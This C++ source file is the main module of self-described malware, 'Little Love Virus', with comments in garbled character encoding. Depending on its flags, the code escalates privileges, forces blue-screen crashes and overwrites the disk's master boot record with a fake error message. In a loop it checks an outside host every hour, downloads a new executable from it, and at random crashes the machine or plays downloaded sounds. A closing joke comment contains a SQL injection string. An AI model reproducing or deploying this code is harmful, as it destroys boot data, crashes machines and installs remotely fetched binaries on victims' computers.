/*
Little Love Virus
Yellow Eel special version
By wurenji,2022
main:main.cpp
The main virus.

command:
/c:����Ĳ���
/r:��������
/b:ֱ������
/m:��MBR
/e:ֱ���˳�
/-b����������
/-s����������
*/

#define __BUILD__ 1

#include"std.h"
#include"func.h"
#include"hide.h"

int _tmain(int argc, TCHAR* c_argv[])
{
	__time64_t now = 0;
	std::wstringstream wss;
	std::wfstream wfs;
	std::wstring arg;
	std::vector<std::wstring> argv(c_argv+1,c_argv+argc-1);
	bool
		cmd_c = false,
		cmd_r = false,
		cmd_b = false,
		cmd_m = false,
		cmd_e = false,
		cmd__b = false,
		cmd__s = false;


	//��ȡargv
	cmd_c = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/c"))) != argv.end();
	cmd_r = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/r"))) != argv.end();
	cmd_b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/b"))) != argv.end();
	cmd_m = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/m"))) != argv.end();
	cmd_e = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/e"))) != argv.end();
	cmd__b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) != argv.end();
	cmd__s = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-s"))) != argv.end();

	if (!cmd_c)
		return 1;//�����ڲ�����

	GetPrivileges();

	if (cmd_b)
		MakeBlueScreen(0xcccccccc);
	if (cmd_m)
		WritePhydriveMBR(0,"Unknown Hard Error.\r\nTry to reboot.\r\n\n\nWindows Boot Manager NT 10.0");
	if (cmd_e)
		return 0;

	while (cmd_r)
	{
		now=_time64(NULL);
		srand(static_cast<unsigned int>(now));
		bool iserror=false;
		wss<<GetDataFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"),iserror);
		int lastbuildnumber = 0;
		wss >> lastbuildnumber;
		if (lastbuildnumber > __BUILD__)
		{
			//download update
			std::wstring newbuildname;
			wss << lastbuildnumber << _T(".exe") << std::flush;
			wss >> newbuildname;
			DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.exe"), _T("%ProgramData%\\llv\\") + newbuildname);
			wfs.open(_T("%ProgramData%\\llv\\launcherobj.ini"), std::ios::out);
			wfs << lastbuildnumber;
			wfs.close();
			//�齱
			if (rand() % 16 == 0&&!cmd__b)
				MakeBlueScreen(0xAA232323);
			if (rand() % 16 == 0&&!cmd__s)
			{
				std::wstring soundid;
				wss << rand() % 5 << std::flush;
				wss >> soundid;
				DownloadFileFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), _T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"));
				PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound" )+ soundid + _T(".wav"),true);

			}
		}
		Sleep(60 * 60 * 1000);//wait 1h

	}
	return 0;
}


/*
���ưɡ�

wurenji

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��ơ��

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��ơ�ơ�

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ������

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��0.7��ơ��

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��-1��ơ��

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��2^64��ơ��

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��÷��֭

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ������

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��""

һ��wurenji�߽�һ�Ҿưɣ�ʲôҲûҪ

һ��wurenji�߽�һ�Ҿưɣ����߳�ȥ�ִӴ��������ִӺ��ų�ȥ����ˮ�������

һ��wurenji�߽�һ�Ҿưɣ����߳�ȥ�ֽ����ֳ�ȥ�ֽ����ֳ�ȥ�������������ϰ��������һ��

һ��wurenji�߽�һ//�Ҿưɣ�Ҫ��һ��ơ��

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ�������̵���

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��1/0��nullptr

һ��wurenji���һ�Ҿưɣ�Ҫ��500��ơ��÷��֭�㾫������Ϻͷ

һ��wurenji�Ѿưɲ���

һ��wurenji��װ���ϰ�����߽�һ�Ҿưɣ�Ҫ��500��ơ�Ʋ��Ҳ���Ǯ

4.29�ڸ�wurenji�ھư������Х����

һ��wurenji�߽�һ�Ҿưɣ�Ҫ��һ��ơ��';DROP TABLE �ư�

wurenji������뿪�˾ưɡ�

Ȼ��һ����������һ������̷����ư�ը�ˡ�

����ɵ�ƣ�����
*/